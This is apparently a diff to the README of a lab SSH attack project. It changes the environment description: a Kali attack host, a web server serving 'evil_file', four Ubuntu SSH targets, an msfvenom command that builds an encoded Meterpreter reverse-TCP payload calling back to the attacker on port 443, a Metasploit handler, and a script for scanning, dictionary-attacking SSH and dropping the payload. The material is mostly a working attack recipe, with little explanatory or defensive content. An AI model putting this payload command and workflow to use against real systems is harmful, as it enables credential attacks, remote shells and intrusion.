@@ -9,9 +9,8 @@ from our web server.
 <h1>The Environment Setup</h1><br>
 <br>
 1. Our Attack machine: <h4>Linux kali 4.16.0-kali2-amd64</h4><br>
-2. Our Web Server: </h4>192.168.203.1/evil_file</h4><br>
-3. Targets: <h4>**4** * **ubuntu-16.04.5-desktop-amd64** in the same virtual network.</h4><br>
-4. Python - paramiko module.<br>
-5. Create payload: <h4>msfvenom --payload linux/x86/meterpreter_reverse_tcp LPORT=443 LHOST=192.168.203.1 -e shikata_ga_nai -f elf -a x86 -o evil_file</h4><br>
-6. msf5 > exploit/multi/handler module<br>
-7. scan_drop.py - Scans, Dictionary Attack, send 1st stage payload, RCE.<br>
+2. Our Web Server: <h4>192.168.203.1/evil_file</h4><br>
+3. 4 target ssh servers on the same virtual network: <h4>ubuntu-16.04.5-desktop-amd64</h4>192.168.203.150<br>192.168.203.151<br>192.168.203.152<br>192.168.203.153<br>
+4. Create payload: <h4>msfvenom --payload linux/x86/meterpreter_reverse_tcp LPORT=443 LHOST=192.168.203.1 -e shikata_ga_nai -f elf -a x86 -o evil_file</h4>
+5. msf5 > <h4>exploit/multi/handler module</h4>
+6. scan_drop.py <h4>Scans, Dictionary Attack, send 1st stage payload, RCE.</h4>
